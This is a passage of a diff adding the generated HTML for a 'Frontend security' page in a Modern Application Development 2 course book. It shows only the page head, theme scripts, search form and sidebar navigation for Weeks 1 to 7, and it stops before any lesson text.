@@ -1,0 +1,4639 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Modern Application Development 2 course reference for the IIT Madras BS Degree">
+      
+      
+      
+        <link rel="canonical" href="https://24f2005644.github.io/appdev2coursebook/week12/02_frontend_security/">
+      
+      
+        <link rel="prev" href="../01_fundamentals_privacy_vs_security/">
+      
+      
+        <link rel="next" href="../03_backend_security/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Frontend security - MAD2 Course Book</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/theme-v2.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#week-12-section-2-frontend-security" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="MAD2 Course Book" class="md-header__button md-logo" aria-label="MAD2 Course Book" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            MAD2 Course Book
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Frontend security
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="MAD2 Course Book" class="md-nav__button md-logo" aria-label="MAD2 Course Book" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    MAD2 Course Book
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 1
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 1
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/01_review_mad1_web_fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Review: MAD1 web fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/02_web_app_development_model/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web application development model
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/03_course_trajectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Course trajectory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/04_javascript_origins_standardization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JavaScript origins and standardization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/05_architectural_implications/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architectural implications
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/06_program_structure_execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Program structure and execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/07_identifiers_statements_expressions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Identifiers, statements, and expressions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/08_data_types_strings_nonvalues/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data types, strings, and non-values
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/09_operators_comparisons_coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operators, comparisons, and coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/10_variables_declarations_scoping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Variables, declarations, and scoping
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/11_control_flow_constructs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Control-flow constructs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/12_functions_execution_patterns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Functions and execution patterns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/13_dom_and_interactivity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The DOM and interactivity
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week1/14_references_tooling_ecosystem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    References, tooling, and ecosystem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 2
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 2
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week2/01_javascript_collections/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JavaScript collections
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week2/02_modularity_and_oop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modularity and object-oriented JavaScript
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week2/03_asynchrony_and_runtime/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Asynchrony and the JavaScript runtime
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week2/04_json/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JSON
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 3
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 3
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/01_introduction_to_frontend/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction to frontend development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/02_programming_paradigms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Programming paradigms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/03_understanding_state/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding state
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/04_state_management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    State management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week3/05_case_study_tictactoe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tic-Tac-Toe case study
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 4
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 4
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week4/01_declarative_rendering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Declarative rendering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week4/02_viewmodel_and_vue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The ViewModel pattern and Vue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week4/03_vue_components/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue components
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week4/04_reactivity_under_the_hood/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reactivity under the hood
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 5
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 5
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/1_architecture_separation_of_concerns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture and separation of concerns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/2_asynchronous_javascript_fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Asynchronous JavaScript fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/3_async_patterns_callbacks_events_promises/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Callbacks, events, and promises
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/4_fetch_api_and_axios/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fetch API and Axios
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week5/5_vue_lifecycle_async_integration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue lifecycle and asynchronous integration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 6
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 6
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week6/01_persistent_storage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistent storage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week6/02_form_validation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Form validation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week6/03_sfc_components/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Single File Components
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week6/04_testing_vue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Testing Vue applications
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 7
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 7
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week7/01_state_management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    State management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week7/02_vue_router/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue Router
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../week7/03_spa_modern_web_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Single-page application architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
